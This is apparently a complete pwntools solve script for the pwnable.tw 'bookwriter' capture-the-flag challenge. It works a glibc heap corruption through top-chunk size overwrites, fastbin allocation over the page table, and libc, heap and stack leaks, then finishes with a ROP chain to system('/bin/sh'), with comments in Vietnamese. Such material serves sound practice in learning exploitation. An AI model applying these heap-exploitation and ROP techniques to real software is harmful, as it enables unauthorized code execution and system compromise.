#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("bookwriter_patched")
libc = ELF("libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on

continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10304
        return remote(host, port)

p = conn()

def add_page(size, content):
    slan(p, b'choice', 1)
    slan(p, b'Size', size)
    sa(p, b'Content', content)
    sleep(0.01)

def edit_page(index, content):
    slan(p, b'choice', 3)
    slan(p, b'Index', index)
    sa(p, b'Content', content)
    sleep(0.01)

def show_page(index):
    slan(p, b'choice', 2)
    slan(p, b'Index', index)

def info():
    slan(p, b'choice', 4)

size = 0x100

sa(p, b'Author', flat(pad(64))) # later to leak heap

for i in range(8):
    add_page(size, b'A')

edit_page(0, b'\n') # Clear page size
add_page(size, b'A') # Fake page size

heap_layout = pad(size, b'\0')
heap_layout += flat(0, size + 0x11, pad(size, b'\0')) * 8
heap_layout += flat(0, 0x671)
edit_page(0, heap_layout) # Fake top chunk size
add_page(0x5c0, b'A') # để lại chunk 0x80 cho vào fastbin

'''
leak heap với author ở đúng thời điểm này là ok nhất
leak heap trước khi free top chunk ở trên thì nó 
malloc 1 chunk 0x1000 byte -> heap layout quá dài để 
thoả mãn metadata các chunk dưới
'''

info() # Cái này malloc gì đó tận 0x1000 byte, tiện thể nó free luôn 0x80 vào fastbin
ru(p, pad(64))
heap_base = leak_bytes(rl(p).strip(), 0x10)
lg("heap base", heap_base)
slan(p, b'change the author', 1)
sa(p, b'Author', flat(pad(0x20), 0, 0x81, 0, 0)) # Fake metadata để tí cấp phát vào đây

page_content = 0x6020a0

heap_layout = pad(size, b'\0')
heap_layout += flat(0, size + 0x11, pad(size, b'\0')) * 8
heap_layout += flat(0, 0x5d1, pad(0x5c0, b'\0'))
heap_layout += flat(0, 0x81, page_content - 0x20)
edit_page(0, heap_layout)
add_page(0x70, b'A')

edit_page(0, b'\n')
add_page(0x70, flat(
    0, 0,
    page_content, # 0
    page_content, # 1
    heap_base + 0x22010, # 2, next top chunk for a second free
    heap_base + 0x22010, # 3
    0, 0, 0, 0,
    p64(0x100) * 4
))

edit_page(2, flat(0, 0xff1)) # Fake top chunk again
add_page(0x1000, b'A') # Free top chunk to unsortedbin

# Leak libc 
edit_page(3, pad(0x10))
show_page(3)
ru(p, pad(0x10))
libc.address = leak_bytes(rn(p, 6), 0x3c3b78)
lg("libc base", libc.address)

# Leak stack
edit_page(0, flat(
    page_content, # 0, phải là địa chỉ hợp lệ mới đc, do strlen làm gì đó 
    page_content, # 1
    libc.symbols['__environ'], # 2
    0, 0, 0, 0, 0,
    p64(0x100) * 3
))

show_page(2)
ru(p, b'Content :\n')
stack = leak_bytes(rn(p, 6))
lg("stack", stack)

# Point to return address
edit_page(1, flat(
    p64(stack - 0x110) * 8,
    p64(0x100) * 8
))

# Overwrite return address
edit_page(7, flat(
    libc.address + 0x0000000000021102, # pop rdi; ret
    binsh(libc),
    libc.address + 0x000000000002058f, # nop; ret
    libc.symbols['system'],
))

rr(p, 1)
ia(p)